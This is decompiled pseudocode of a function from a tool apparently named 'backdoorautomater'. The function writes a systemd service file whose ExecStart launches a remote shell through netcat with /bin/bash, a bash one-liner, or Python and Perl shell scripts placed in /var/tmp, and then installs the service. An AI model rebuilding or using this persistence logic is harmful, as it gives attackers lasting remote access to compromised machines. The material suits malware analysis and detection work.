__int64 __fastcall backdoorautomater::newservice::write_service(__int128 *a1, __int128 *a2, __int128 *a3, char a4)
{
  __int64 v4; // rax
  __int128 v7; // xmm0
  __int64 v8; // r12
  __int64 v9; // rax
  __int64 v10; // rax
  __int128 v11; // xmm0
  char v12; // bp
  char v13; // bp
  __int128 v15; // [rsp+0h] [rbp-B8h] BYREF
  __int64 v16; // [rsp+10h] [rbp-A8h]
  __int128 v17; // [rsp+20h] [rbp-98h] BYREF
  __int64 v18; // [rsp+30h] [rbp-88h]
  __int128 v19; // [rsp+40h] [rbp-78h] BYREF
  __int128 v20; // [rsp+50h] [rbp-68h]
  __int64 v21; // [rsp+68h] [rbp-50h]
  __int128 v22; // [rsp+70h] [rbp-48h] BYREF
  __int64 v23; // [rsp+80h] [rbp-38h]

  LOBYTE(v4) = 1;
  v21 = v4;
  <alloc::string::String as core::clone::Clone>::clone(&v22, a2);
  if ( !(unsigned __int8)<&str as core::str::pattern::Pattern>::is_contained_in(
                           *((_QWORD *)a1 + 1),
                           *((_QWORD *)a1 + 2)) )
    alloc::vec::Vec<T,A>::extend_from_slice(a1, aService_0, 8LL);
  switch ( a4 )
  {
    case 1:
      v7 = *(__int128 *)((char *)a3 + 8);
      *(_QWORD *)&v19 = aExecstartNc;
      *((_QWORD *)&v19 + 1) = 13LL;
      v20 = v7;
      alloc::str::join_generic_copy(&v15, &v19, 2LL, 1LL, 0LL);
      v18 = v16;
      v17 = v15;
      alloc::vec::Vec<T,A>::extend_from_slice(&v17, asc_1661B1, 1LL);
      alloc::vec::Vec<T,A>::extend_from_slice(&v17, *((_QWORD *)a2 + 1), *((_QWORD *)a2 + 2));
      alloc::vec::Vec<T,A>::extend_from_slice(&v17, aEBinBash_0, 14LL);
      std::fs::File::create(&v19, a1);
      if ( (_DWORD)v19 )
      {
        v8 = *((_QWORD *)&v19 + 1);
        goto LABEL_55;
      }
      LODWORD(v15) = DWORD1(v19);
      v8 = std::io::Write::write_all(&v15, aUnit, 7LL);
      if ( !v8 )
      {
        v8 = std::io::Write::write_all(&v15, aDescriptionMyC, 30LL);
        if ( !v8 )
        {
          v8 = std::io::Write::write_all(&v15, aAfterNetworkOn, 29LL);
          if ( !v8 )
          {
            v8 = std::io::Write::write_all(&v15, aService_1, 10LL);
            if ( !v8 )
            {
              v8 = std::io::Write::write_all(&v15, aExecstartpreBi_1, 27LL);
              if ( !v8 )
              {
                v8 = std::io::Write::write_all(&v15, *((_QWORD *)&v17 + 1), v18);
                if ( !v8 )
                {
                  v8 = std::io::Write::write_all(&v15, aTypeSimple, 13LL);
                  if ( !v8 )
                  {
                    v8 = std::io::Write::write_all(&v15, aInstall, 10LL);
                    if ( !v8 )
                    {
                      v8 = std::io::Write::write_all(&v15, aWantedbyDefaul, 24LL);
                      if ( !v8 )
                        goto LABEL_59;
                    }
                  }
                }
              }
            }
          }
        }
      }
      goto LABEL_54;
    case 2:
      v11 = *(__int128 *)((char *)a3 + 8);
      *(_QWORD *)&v19 = aExecstartBinBa;
      *((_QWORD *)&v19 + 1) = 44LL;
      v20 = v11;
      alloc::str::join_generic_copy(&v15, &v19, 2LL, 1LL, 0LL);
      v18 = v16;
      v17 = v15;
      alloc::vec::Vec<T,A>::extend_from_slice(&v17, asc_1661C0, 1LL);
      alloc::vec::Vec<T,A>::extend_from_slice(&v17, *((_QWORD *)a2 + 1), *((_QWORD *)a2 + 2));
      alloc::vec::Vec<T,A>::extend_from_slice(&v17, a01_0, 7LL);
      std::fs::File::create(&v19, a1);
      if ( (_DWORD)v19 )
      {
        v8 = *((_QWORD *)&v19 + 1);
LABEL_55:
        core::ptr::drop_in_place<alloc::string::String>(&v17);
        v12 = 0;
        goto LABEL_56;
      }
      LODWORD(v15) = DWORD1(v19);
      v8 = std::io::Write::write_all(&v15, aUnit, 7LL);
      if ( v8 )
        goto LABEL_54;
      v8 = std::io::Write::write_all(&v15, aDescriptionMyC, 30LL);
      if ( v8
        || (v8 = std::io::Write::write_all(&v15, aAfterNetworkOn, 29LL)) != 0
        || (v8 = std::io::Write::write_all(&v15, aService_1, 10LL)) != 0
        || (v8 = std::io::Write::write_all(&v15, aExecstartpreBi_1, 27LL)) != 0
        || (v8 = std::io::Write::write_all(&v15, *((_QWORD *)&v17 + 1), v18)) != 0
        || (v8 = std::io::Write::write_all(&v15, aTypeSimple, 13LL)) != 0
        || (v8 = std::io::Write::write_all(&v15, aInstall, 10LL)) != 0
        || (v8 = std::io::Write::write_all(&v15, aWantedbyDefaul, 24LL)) != 0 )
      {
LABEL_54:
        core::ptr::drop_in_place<std::fs::File>((unsigned int)v15);
        goto LABEL_55;
      }
LABEL_59:
      core::ptr::drop_in_place<std::fs::File>((unsigned int)v15);
      core::ptr::drop_in_place<alloc::string::String>(&v17);
LABEL_60:
      v13 = 0;
LABEL_61:
      v16 = *((_QWORD *)a1 + 2);
      v15 = *a1;
      *(_QWORD *)&v20 = v23;
      v19 = v22;
      ((void (__fastcall *)(__int128 *, __int128 *))backdoorautomater::newservice::create_service)(&v15, &v19);
      if ( !v13 )
      {
        core::ptr::drop_in_place<alloc::string::String>(a3);
        core::ptr::drop_in_place<alloc::string::String>(a2);
      }
      return 0LL;
    case 3:
      v16 = *((_QWORD *)a2 + 2);
      v15 = *a2;
      *(_QWORD *)&v20 = *((_QWORD *)a3 + 2);
      v19 = *a3;
      v9 = backdoorautomater::newservice::write_shell_pyfile(&v15, &v19);
      backdoorautomater::sanitizer::sanitize_return_fn(v9);
      *(_QWORD *)&v19 = aExecstartPytho;
      *((_QWORD *)&v19 + 1) = 17LL;
      *(_QWORD *)&v20 = aVarTmpShellPy_0;
      *((_QWORD *)&v20 + 1) = 18LL;
      alloc::str::join_generic_copy(&v15, &v19, 2LL, 1LL, 0LL);
      v18 = v16;
      v17 = v15;
      std::fs::File::create(&v19, a1);
      if ( (_DWORD)v19 )
      {
        v8 = *((_QWORD *)&v19 + 1);
        goto LABEL_34;
      }
      LODWORD(v15) = DWORD1(v19);
      v8 = std::io::Write::write_all(&v15, aUnit, 7LL);
      if ( v8 )
        goto LABEL_33;
      v8 = std::io::Write::write_all(&v15, aDescriptionMyC, 30LL);
      if ( v8 )
        goto LABEL_33;
      v8 = std::io::Write::write_all(&v15, aAfterNetworkOn, 29LL);
      if ( v8 )
        goto LABEL_33;
      v8 = std::io::Write::write_all(&v15, aService_1, 10LL);
      if ( v8 )
        goto LABEL_33;
      v8 = std::io::Write::write_all(&v15, aExecstartpreBi_1, 27LL);
      if ( v8 )
        goto LABEL_33;
      v8 = std::io::Write::write_all(&v15, *((_QWORD *)&v17 + 1), v18);
      if ( v8 )
        goto LABEL_33;
      v8 = std::io::Write::write_all(&v15, asc_1662A8, 1LL);
      if ( v8 )
        goto LABEL_33;
      v8 = std::io::Write::write_all(&v15, aTypeSimple, 13LL);
      if ( v8 )
        goto LABEL_33;
      v8 = std::io::Write::write_all(&v15, aInstall, 10LL);
      if ( v8 )
        goto LABEL_33;
      v8 = std::io::Write::write_all(&v15, aWantedbyDefaul, 24LL);
      if ( v8 )
        goto LABEL_33;
      goto LABEL_65;
    case 4:
      v16 = *((_QWORD *)a2 + 2);
      v15 = *a2;
      *(_QWORD *)&v20 = *((_QWORD *)a3 + 2);
      v19 = *a3;
      v10 = backdoorautomater::newservice::write_shell_perl(&v15, &v19);
      backdoorautomater::sanitizer::sanitize_return_fn(v10);
      *(_QWORD *)&v19 = aExecstartPerl;
      *((_QWORD *)&v19 + 1) = 15LL;
      *(_QWORD *)&v20 = aVarTmpShellPl_0;
      *((_QWORD *)&v20 + 1) = 18LL;
      alloc::str::join_generic_copy(&v15, &v19, 2LL, 1LL, 0LL);
      v18 = v16;
      v17 = v15;
      std::fs::File::create(&v19, a1);
      if ( (_DWORD)v19 )
      {
        v8 = *((_QWORD *)&v19 + 1);
      }
      else
      {
        LODWORD(v15) = DWORD1(v19);
        v8 = std::io::Write::write_all(&v15, aUnit, 7LL);
        if ( !v8 )
        {
          v8 = std::io::Write::write_all(&v15, aDescriptionMyC, 30LL);
          if ( !v8 )
          {
            v8 = std::io::Write::write_all(&v15, aAfterNetworkOn, 29LL);
            if ( !v8 )
            {
              v8 = std::io::Write::write_all(&v15, aService_1, 10LL);
              if ( !v8 )
              {
                v8 = std::io::Write::write_all(&v15, aExecstartpreBi_1, 27LL);
                if ( !v8 )
                {
                  v8 = std::io::Write::write_all(&v15, *((_QWORD *)&v17 + 1), v18);
                  if ( !v8 )
                  {
                    v8 = std::io::Write::write_all(&v15, asc_1662A8, 1LL);
                    if ( !v8 )
                    {
                      v8 = std::io::Write::write_all(&v15, aTypeSimple, 13LL);
                      if ( !v8 )
                      {
                        v8 = std::io::Write::write_all(&v15, aInstall, 10LL);
                        if ( !v8 )
                        {
                          v8 = std::io::Write::write_all(&v15, aWantedbyDefaul, 24LL);
                          if ( !v8 )
                          {
LABEL_65:
                            core::ptr::drop_in_place<std::fs::File>((unsigned int)v15);
                            core::ptr::drop_in_place<alloc::string::String>(&v17);
                            v13 = 1;
                            goto LABEL_61;
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
LABEL_33:
        core::ptr::drop_in_place<std::fs::File>((unsigned int)v15);
      }
LABEL_34:
      core::ptr::drop_in_place<alloc::string::String>(&v17);
      v12 = 1;
LABEL_56:
      core::ptr::drop_in_place<alloc::string::String>(&v22);
      if ( !v12 )
      {
        core::ptr::drop_in_place<alloc::string::String>(a3);
        core::ptr::drop_in_place<alloc::string::String>(a2);
      }
      core::ptr::drop_in_place<alloc::string::String>(a1);
      return v8;
    default:
      goto LABEL_60;
  }
}